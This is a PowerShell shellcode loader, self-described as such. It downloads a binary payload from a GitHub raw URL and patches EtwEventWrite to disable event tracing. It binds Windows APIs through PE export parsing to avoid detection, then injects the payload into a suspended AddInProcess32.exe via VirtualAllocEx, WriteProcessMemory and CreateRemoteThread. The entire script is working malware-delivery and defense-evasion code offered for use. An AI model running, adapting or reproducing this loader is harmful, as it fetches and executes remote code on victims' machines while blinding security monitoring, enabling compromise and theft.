[CmdletBinding()]
param(
    [string]$Url = 'https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin',

    [string]$Target = "$env:windir\Microsoft.NET\Framework64\v4.0.30319\AddInProcess32.exe",

    [string]$Arguments = '',

    [switch]$SkipEtw,

    [switch]$ResumeMain
)

function Write-Step {
    param([string]$Message, [string]$Color = 'Cyan')
    Write-Host ("[*] {0}  {1}" -f (Get-Date -Format 'HH:mm:ss.fff'), $Message) -ForegroundColor $Color
}

function Write-Err {
    param([string]$Message)
    Write-Host ("[!] {0}  {1}" -f (Get-Date -Format 'HH:mm:ss.fff'), $Message) -ForegroundColor Red
    exit 1
}

function Get-ExportAddress {
    param([IntPtr]$Base, [string]$Name)
    $e_lfanew = [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]::Add($Base, 0x3C))
    $optionalHeader = [IntPtr]::Add($Base, $e_lfanew + 0x18)
    $magic = [System.Runtime.InteropServices.Marshal]::ReadInt16($optionalHeader)
    $directoryOffset = 0x60
    if ($magic -eq 0x20B) { $directoryOffset = 0x70 }
    $exportRva = [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]::Add($optionalHeader, $directoryOffset))
    $exportDirectory = [IntPtr]::Add($Base, $exportRva)
    $nameCount = [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]::Add($exportDirectory, 0x18))
    $namesTable = [IntPtr]::Add($Base, [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]::Add($exportDirectory, 0x20)))
    $functionsTable = [IntPtr]::Add($Base, [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]::Add($exportDirectory, 0x1C)))
    $ordinalsTable = [IntPtr]::Add($Base, [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]::Add($exportDirectory, 0x24)))
    for ($i = 0; $i -lt $nameCount; $i++) {
        $nameRva = [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]::Add($namesTable, $i * 4))
        $candidate = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi([IntPtr]::Add($Base, $nameRva))
        if ($candidate -eq $Name) {
            $ordinal = [System.Runtime.InteropServices.Marshal]::ReadInt16([IntPtr]::Add($ordinalsTable, $i * 2))
            $functionRva = [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]::Add($functionsTable, $ordinal * 4))
            return [IntPtr]::Add($Base, $functionRva)
        }
    }
    return [IntPtr]::Zero
}

function New-NativeDelegate {
    param([Type]$ReturnType, [Type[]]$ParameterTypes)
    $builder = $dynamicModule.DefineType(('d' + [guid]::NewGuid().ToString('N')), ([System.Reflection.TypeAttributes]::Sealed -bor [System.Reflection.TypeAttributes]::Public -bor [System.Reflection.TypeAttributes]::AnsiClass), [System.MulticastDelegate])
    $ctor = $builder.DefineConstructor([System.Reflection.MethodAttributes]::RTSpecialName -bor [System.Reflection.MethodAttributes]::HideBySig -bor [System.Reflection.MethodAttributes]::Public, [System.Reflection.CallingConventions]::Standard, [Type[]]@([object], [IntPtr]))
    $ctor.SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime -bor [System.Reflection.MethodImplAttributes]::Managed)
    $invoke = $builder.DefineMethod('Invoke', ([System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::HideBySig -bor [System.Reflection.MethodAttributes]::NewSlot -bor [System.Reflection.MethodAttributes]::Virtual), $ReturnType, $ParameterTypes)
    $invoke.SetImplementationFlags([System.Reflection.MethodImplAttributes]::Runtime -bor [System.Reflection.MethodImplAttributes]::Managed)
    $builder.CreateType()
}

function Get-Api {
    param([IntPtr]$ModuleBase, [string]$Function, [Type]$ReturnType, [Type[]]$ParameterTypes)
    $address = Get-ExportAddress -Base $ModuleBase -Name $Function
    if ($address -eq [IntPtr]::Zero) { throw ("export not found: " + $Function) }
    $delegateType = New-NativeDelegate -ReturnType $ReturnType -ParameterTypes $ParameterTypes
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($address, $delegateType)
}

Write-Step 'ps1 shellcode loader :: no add-type, pe-parse interop, etw patch -> addinprocess32 injection' 'Magenta'

$dynamicAssembly = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('dyn')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$dynamicModule = $dynamicAssembly.DefineDynamicModule('dyn')

$current = Get-Process -Id $PID
$kernel32Base = ($current.Modules | Where-Object { $_.ModuleName -eq 'kernel32.dll' } | Select-Object -First 1).BaseAddress
$ntdllBase = ($current.Modules | Where-Object { $_.ModuleName -eq 'ntdll.dll' } | Select-Object -First 1).BaseAddress
if (-not $kernel32Base -or -not $ntdllBase) { Write-Err 'module bases not found' }
Write-Step ("modules resolved: kernel32 0x{0:X} | ntdll 0x{1:X}" -f $kernel32Base.ToInt64(), $ntdllBase.ToInt64())

try {
    $virtualAllocEx = Get-Api -ModuleBase $kernel32Base -Function 'VirtualAllocEx' -ReturnType ([IntPtr]) -ParameterTypes ([Type[]]@([IntPtr], [IntPtr], [uint32], [uint32], [uint32]))
    $writeProcessMemory = Get-Api -ModuleBase $kernel32Base -Function 'WriteProcessMemory' -ReturnType ([bool]) -ParameterTypes ([Type[]]@([IntPtr], [IntPtr], [byte[]], [uint32], [IntPtr]))
    $virtualProtectEx = Get-Api -ModuleBase $kernel32Base -Function 'VirtualProtectEx' -ReturnType ([bool]) -ParameterTypes ([Type[]]@([IntPtr], [IntPtr], [IntPtr], [uint32], [IntPtr]))
    $createRemoteThread = Get-Api -ModuleBase $kernel32Base -Function 'CreateRemoteThread' -ReturnType ([IntPtr]) -ParameterTypes ([Type[]]@([IntPtr], [IntPtr], [uint32], [IntPtr], [IntPtr], [uint32], [IntPtr]))
    $createProcessA = Get-Api -ModuleBase $kernel32Base -Function 'CreateProcessA' -ReturnType ([bool]) -ParameterTypes ([Type[]]@([string], [string], [IntPtr], [IntPtr], [bool], [uint32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]))
    $resumeThread = Get-Api -ModuleBase $kernel32Base -Function 'ResumeThread' -ReturnType ([uint32]) -ParameterTypes ([Type[]]@([IntPtr]))
    $closeHandle = Get-Api -ModuleBase $kernel32Base -Function 'CloseHandle' -ReturnType ([bool]) -ParameterTypes ([Type[]]@([IntPtr]))
    Write-Step 'kernel32 apis bound via emitted delegates' 'Green'
} catch {
    Write-Err ("api binding failed: " + $_.Exception.Message)
}

if (-not $SkipEtw) {
    try {
        $virtualProtect = Get-Api -ModuleBase $kernel32Base -Function 'VirtualProtect' -ReturnType ([bool]) -ParameterTypes ([Type[]]@([IntPtr], [IntPtr], [uint32], [IntPtr]))
        $etwName = 'EtwEvent' + 'Write'
        $etwAddress = Get-ExportAddress -Base $ntdllBase -Name $etwName
        if ($etwAddress -eq [IntPtr]::Zero) { throw 'export not found' }
        $probe = [uint32]0
        $pin = [System.Runtime.InteropServices.GCHandle]::Alloc($probe, [System.Runtime.InteropServices.GCHandleType]::Pinned)
        try {
            $null = $virtualProtect.Invoke($etwAddress, [IntPtr]::new(1), [uint32]0x40, $pin.AddrOfPinnedObject())
            [System.Runtime.InteropServices.Marshal]::WriteByte($etwAddress, 0xC3)
            $restore = [System.Runtime.InteropServices.Marshal]::ReadInt32($pin.AddrOfPinnedObject())
            $null = $virtualProtect.Invoke($etwAddress, [IntPtr]::new(1), [uint32]$restore, $pin.AddrOfPinnedObject())
        } finally {
            $pin.Free()
        }
        Write-Step ("etw patched @ 0x{0:X}" -f $etwAddress.ToInt64()) 'Green'
    } catch {
        Write-Err ("etw patch failed: " + $_.Exception.Message)
    }
} else {
    Write-Step 'etw patch skipped by switch' 'Yellow'
}

if (Test-Path -LiteralPath $Url) {
    try {
        $sc = [System.IO.File]::ReadAllBytes($Url)
        Write-Step ("payload loaded from disk: {0} bytes" -f $sc.Length) 'Green'
    } catch {
        Write-Err ("local read failed: " + $_.Exception.Message)
    }
} else {
    Write-Step ("downloading payload: {0}" -f $Url)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36')
        $sc = $wc.DownloadData($Url)
    } catch {
        Write-Err ("download failed: " + $_.Exception.Message)
    }
}

if (-not $sc -or $sc.Length -lt 2) { Write-Err 'payload empty or too small' }
Write-Step ("payload ready: {0} bytes" -f $sc.Length) 'Green'

if (-not (Test-Path -LiteralPath $Target)) { Write-Err ("target missing: " + $Target) }
Write-Step ("target resolved: {0}" -f $Target)

$siSize = 68
$piSize = 16
if ([IntPtr]::Size -eq 8) { $siSize = 104; $piSize = 24 }
$siPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($siSize)
$piPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($piSize)
[System.Runtime.InteropServices.Marshal]::Copy((New-Object byte[] $siSize), 0, $siPtr, $siSize)
[System.Runtime.InteropServices.Marshal]::Copy((New-Object byte[] $piSize), 0, $piPtr, $piSize)
[System.Runtime.InteropServices.Marshal]::WriteInt32($siPtr, $siSize)

$cmdline = ('"{0}" {1}' -f $Target, $Arguments)
$flags = [uint32](0x00000004 -bor 0x08000000)

try {
    $created = $createProcessA.Invoke($Target, $cmdline, [IntPtr]::Zero, [IntPtr]::Zero, $false, $flags, [IntPtr]::Zero, [IntPtr]::Zero, $siPtr, $piPtr)
} catch {
    Write-Err ("createprocess threw: " + $_.Exception.Message)
}
if (-not $created) { Write-Err 'createprocess failed' }

$hProcess = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($piPtr, 0)
$hThread = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($piPtr, [IntPtr]::Size)
$remotePid = [System.Runtime.InteropServices.Marshal]::ReadInt32($piPtr, [IntPtr]::Size * 2)
$remoteTid = [System.Runtime.InteropServices.Marshal]::ReadInt32($piPtr, ([IntPtr]::Size * 2) + 4)
Write-Step ("spawned suspended: {0} (pid {1}, tid {2})" -f (Split-Path -Leaf $Target), $remotePid, $remoteTid) 'Green'

$remote = $virtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, [uint32]$sc.Length, [uint32]0x3000, [uint32]0x04)
if ($remote -eq [IntPtr]::Zero) { Write-Err 'virtualallocex failed' }
Write-Step ("remote buffer allocated @ 0x{0:X} ({1} bytes, rw)" -f $remote.ToInt64(), $sc.Length) 'Green'

$wrote = $writeProcessMemory.Invoke($hProcess, $remote, $sc, [uint32]$sc.Length, [IntPtr]::Zero)
if (-not $wrote) { Write-Err 'writeprocessmemory failed' }
Write-Step ("payload written: {0} bytes" -f $sc.Length) 'Green'

$probe2 = [uint32]0
$pin2 = [System.Runtime.InteropServices.GCHandle]::Alloc($probe2, [System.Runtime.InteropServices.GCHandleType]::Pinned)
try {
    $flipped = $virtualProtectEx.Invoke($hProcess, $remote, [IntPtr]::new([int64]$sc.Length), [uint32]0x20, $pin2.AddrOfPinnedObject())
} finally {
    $pin2.Free()
}
if (-not $flipped) { Write-Err 'virtualprotectex failed' }
Write-Step 'remote page flipped to rx' 'Green'

$thread = $createRemoteThread.Invoke($hProcess, [IntPtr]::Zero, [uint32]0, $remote, [IntPtr]::Zero, [uint32]0, [IntPtr]::Zero)
if ($thread -eq [IntPtr]::Zero) { Write-Err 'createremotethread failed' }
Write-Step 'remote thread started' 'Green'

if ($ResumeMain) {
    $null = $resumeThread.Invoke($hThread)
    Write-Step 'main thread resumed' 'Green'
} else {
    Write-Step 'main thread left suspended :: target kept alive' 'Yellow'
}

$null = $closeHandle.Invoke($thread)
$null = $closeHandle.Invoke($hThread)
$null = $closeHandle.Invoke($hProcess)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($siPtr)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($piPtr)

Write-Step ("done :: payload live in target pid {0}" -f $remotePid) 'Magenta'
